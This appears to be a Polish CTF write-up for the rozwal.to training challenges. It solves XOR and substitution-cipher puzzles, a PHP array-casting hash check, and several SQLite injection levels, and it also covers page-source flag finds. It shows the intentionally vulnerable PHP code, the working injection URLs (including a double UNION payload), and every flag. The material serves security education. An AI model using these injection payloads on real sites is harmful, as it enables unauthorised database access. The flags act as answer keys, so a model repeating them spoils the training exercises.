# [rozwal.to](stary.rozwal.to)




## [Crypto](https://stary.rozwal.to/zadanie/15)



### [Bob uwielbia xorować](http://training.securitum.com/rozwal/abc/6.php)

[Rozwiązanie](crypt/bob.py): _SingleXorByteCipher_

**Metoda**: 

1. Rozkodować podany tekst w [base64][1].

2. Wiadomo, że tekst jest zaszyfrowany jednym bajtem.
   
   [Metodą siłową][2] przetestować wszystkie bajty (0–255).
   Można jednocześnie badać czy któreś z rozszyfrowanych wersji jest alfanumeryczne 
   i zawiera w sobie ciąg "ROZWAL_{". 



### [Alice też xoruje](http://training.securitum.com/rozwal/abc/7.php)

[Rozwiązanie](crypt/alice.py): _AliceIsImpressed_

**Metoda**:

1. Znane są właściwości funkcji xor:
   ```
    x ^ 0 = x
    x ^ x = 0
   ```
   
2. Zatem:
   ```
    a ^ b = c
    a ^ b ^ a = c ^ a
    b ^ 0 = c ^ a
    b = c ^ a
    
    
    s - bajty tekstu
    k - bajty klucza
    t = "ROZWAL_{"
    
    s0 ^ R = k0
    s1 ^ O = k1
    s2 ^ Z = k2
    s3 ^ W = k3
    s4 ^ A = k4
    s5 ^ L = k5
    s6 ^ _ = k6
    s7 ^ { = k7
   ```

   Znając fragment tekstu jakim jest "ROZWAL_{" (i wiedząc, że długość klucza < 8)
   można xorować kolejne bajty tekstu przez "ROZWAL_{".

3. W pętli od początku tekstu do jego końca minus długość ciągu "ROZWAL_{" wykonywać
   operację XOR dla każdego z ośmiu znaków. Następnie trzeba się przesunąć w tekście
   o znak dalej i powtarzać do skutku.
   
4. Wśród odszyfrowanych ośmioznakowych fragmentów poszukać jakiegoś (klucza), który ma sens.

5. Przexorować cały tekst znalezionym kluczem. 



### [Cweyk funcbjqlsiluqe](http://training.securitum.com/rozwal/crypto/3.php)

[Rozwiązanie](crypt/english.py): _SubStitutionCipherIsWeak_

**Metoda**: 

1. Znaleźć [częstość występowania liter w języku angielskim][5]

2. Kilka z podstawień mamy za darmo: 'KUWQJG' = 'ROZWAL'.

3. Wzorując się na znajomości angielskiego oraz porównując częstość występowania liter
   zdefiniować słownik z postawieniami.
   
4. Podmienić litery w tekście.



### [Znajdź kolizję](http://training.securitum.com/rozwal/crypto/4.php)

[Rozwiązanie](http://training.securitum.com/rozwal/crypto/4.php?s1[]=znalazlam&s2[]=kolizje): _ItsYourBirthday!_

**Metoda**:

1. Odczytać komentarz w źródle strony.

    ```php
    function h($s) {
      $s = md5('Sx12s;!,.alxMausA_!s'.$s);
      $s = substr($s, 0, 16); // 64 bity
      return $s;
    }
    
    if(isset($_GET['s1']) && isset($_GET['s2'])) {
      $s1 = $_GET['s1'];
      $s2 = $_GET['s2'];
    
      if($s1 !== $s2) {
        echo h($s1) ." - ". h($s2)."<br/>";
        if(h($s1) === h($s2)) {
          echo "Flaga: ".$flaga;
        } else {
          echo "Hashe sie roznia<br/>";
        }
      } else {
        echo "Teksty sa identyczne<br/>";
      }
    }
    ```

   Wynika z niego, że w parametrach zapytania GET można przesłać zmienne `s1` i `s2`.
   Flaga jest wypisywna, kiedy hashe tych dwóch zmiennych skonkatenowane z ciągiem
   'Sx12s;!,.alxMausA_!s' są identyczne, przy czym same zmienne muszą być różne. 
   
   Funkcją hashującą jest [MD5][4], a dokładniej jego pierwsze 16 znaków (64 bity). 

2. Wykorzystać słabość języka PHP, który przy konkatenacji stringa z **tablicą**
   rzutuje tablię na 'Array'. Porównanie zmiennych `$s1 !== $s2` wykaże fałsz,
   bo tablice mają różną zawartość, a powstały hash będzie taki sam przez rzutowanie.
   
3. Przekazać w parametrach zapytania tablice `s1[]` i `s2[]` z dowolnym przypisaniem wartości.

   np. http://training.securitum.com/rozwal/crypto/4.php?s1[]=znalazlam&s2[]=kolizje




## [Gimnazjum SQL](https://stary.rozwal.to/zadanie/13)



### [Proste](http://training.securitum.com/rozwal/gim/gimnazjum1/)

[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum1/?id=id): _ZjazdGimboli_

**Metoda**:

1. Otworzyć źródło strony, w którym można znaleźć:
    
    ```php
    <!--?php readfile(__FILE__);
    $db= new SQLite3('db.db');
    $res = $db--->
    
    query('SELECT name FROM flags WHERE id='.$_GET['id']);
    while($r=$res-&gt;fetchArray()) {
	    echo $r['name'];
    }
    ```

2. W zapytaniu wstrzykujemy parametr `id=id`.



### [Nie takie trudne](http://training.securitum.com/rozwal/gim/gimnazjum2/)

[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=id--): _OdZjazduGimboliGlowaBoli_

**Metoda**:

1. Na stronie dany jest fragment kodu PHP:

   ```php
   query('SELECT name FROM flags WHERE id='.$_GET['id'].' LIMIT 1'); 
   while($r=$res->fetchArray()) { 
       echo $r['name']; 
   }
   ```
   Do bazy danych [SQLite][3] wysyłane jest zapytanie o flagę o podanym id,
   następnie wynik jest wyświetlany na stronie.
    
   Zmienna `id` jest pobierana z parametru zapytania GET do serwera.

2. Metodą siłową próbować podać w parametrze zapytania GET kolejne id:
   
   [http://training.securitum.com/rozwal/gim/gimnazjum2/?id=0](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=0)
   
   ...
   
   Aż do skutku:
   
   [http://training.securitum.com/rozwal/gim/gimnazjum2/?id=3](http://training.securitum.com/rozwal/gim/gimnazjum2/?id=3)
   
 3. Wszystkie flagi można wykraść wstrzymując w parametrze zapytania `id=id--`.
    
    Otrzymany rezultat:
    ```
    ROZWAL_NIE_TEN_FORMATROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{OdZjazduGimboliGlowaBoli}
    ```
 

### [Trochę ciężej](http://training.securitum.com/rozwal/gim/gimnazjum3/)

[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum3/?id=id;): _SelectNameFromGimbus_

**Metoda**:

1. Ze źródła strony:

    ```php
    <!--?php
    readfile(__FILE__);
    $db= new SQLite3('db.db');
    $_GET['id'] = str_replace(array('-','*'),'',$_GET['id']);
    $res = $db--->
    
    query('SELECT name FROM flags WHERE id='.$_GET['id'].' LIMIT 1');
    while($r=$res-&gt;fetchArray()) {
	    echo $r['name'];
    }
    ```
    
    Tym razem nie jest możliwe dodanie komentarza w SQL (`--`), ponieważ taki ciąg jest podmieniany na `**`.
    
2. Wstrzyknąć `id=id;`. Średnik kończy zapytanie SQLowe, przez co zwracany jest wynik bez ograniczenia do 1.

    ```
    ROZWAL_NIE_TEN_FORMATROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{ZjazdGimboli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{SelectNameFromGimbus}
    ```



### [Do najprostszych nie należy](http://training.securitum.com/rozwal/gim/gimnazjum4/)

[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum4/?id=11111%20union%20select%20%27hania%22%20union%20select%20name%20from%20flags%20where%20%221%22=%221%27): _DoubleUnion_

**Metoda**:

1. Zajrzeć w źródło strony:

    ```php
    <!--?php
    readfile(__FILE__);
    $db= new SQLite3('db.db');
    $_GET['id'] = str_replace('-','',$_GET['id']);

    $odp='';

    $res = $db-->
 
    query('SELECT name FROM flags WHERE id='.$_GET['id'].' LIMIT 1');
    while($r=$res-&gt;fetchArray()) {
	    $odp=$r['name'];
    }

    $res = $db-&gt;query('SELECT count(*) FROM flags WHERE name="'.$odp.'"');
    while($r=$res-&gt;fetchArray()) {
	    echo $r[0];
    }
    ```

2. Do wyniku pierwszego zapytania przechowywanego w zmiennej `odp` trzeba dokleić kawałek kodu SQL, który
   pozwoli na atak podczas drugiego zapytania.
   
   Przez obecność `LIMIT 1`, wynik zapytania o id powinien zwrócić 0 wyników, żeby pod uwagę był brany drugi człon zapytania, które
   chcemy dokleić.
   
   Aby upewnić się, że wstawiamy id, które nie istnieje wystarczy zapytanie:
   [http://training.securitum.com/rozwal/gim/gimnazjum4/?id=11111](),
   które wypisuje 0 na stronie.
   
3. Następnie należy dopisać kawałek zapytania, które będzie zawiera w sobie stringa z kolejnym wstrzykiwanym
   zapytaniem i zostanie przekazane do zmiennej `odp`:
   `union select 'hania" union select name from flags where "1"="1'`
   
   Istotne są różne znaki ' i ", żeby nie zniszczyć struktury zapytania.
   
4. Całe zapytanie przesłać w URLu:

   `?id=11111 union select 'hania" union select name from flags where "1"="1'`

   Odpowiedź:

   `0ROZWAL_NIE_TEN_FORMATROZWAL_{DoubleUnion}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{SelectNameFromGimbus}ROZWAL_{ZjazdGimboli}`





## [Zerówka](https://stary.rozwal.to/zadanie/11)



### [Jak tego nie rozwalisz - usuń konto](http://training.securitum.com/rozwal/zerowka/zerowka_1.php)

**Rozwiązanie**: _DontMessWithZohan_

**Metoda**:

1. Ze źródła strony: `<!-- ROZWAL_{DontMessWithZohan}-->`



### [ha ha ;)](http://training.securitum.com/rozwal/zerowka/zerowka_2.php)

**Rozwiązanie**: _DontMessWithZohan2_

**Metoda**:

1. Wpisać cokolwiek z pole tekstowe i kliknąć "Zaloguj".

2. Po przeniesieniu na 404 cofnąć stronę w przeglądarce.

3. Zajrzeć w źródło strony. Sieć > zerowka_2.php.
   W odpowiedzi z serwera podany jest parametr:
   `Flag: ROZWAL_{DontMessWithZohan2}`



### [Typowa flaga za 1p.](http://training.securitum.com/rozwal/zerowka/zerowka_5.php)

**Rozwiązanie**: _ILikeBiscuits_

**Metoda**:

1. W źródle strony, w drugim z załączonych skryptów w HTMLu jest napisane hasło.

   ```javascript
   function checkPassword() {
	   if (document.getElementById("password").value == "realpassword") {
		   alert('ROZWAL_{ILikeBiscuits}');
	   }
    }
   ```


[1]: https://en.wikipedia.org/wiki/Base64
[2]: https://en.wikipedia.org/wiki/Brute-force_attack
[3]: www.sqlite.org/src/
[4]: https://en.wikipedia.org/wiki/MD5
[5]: https://en.wikipedia.org/wiki/Letter_frequency
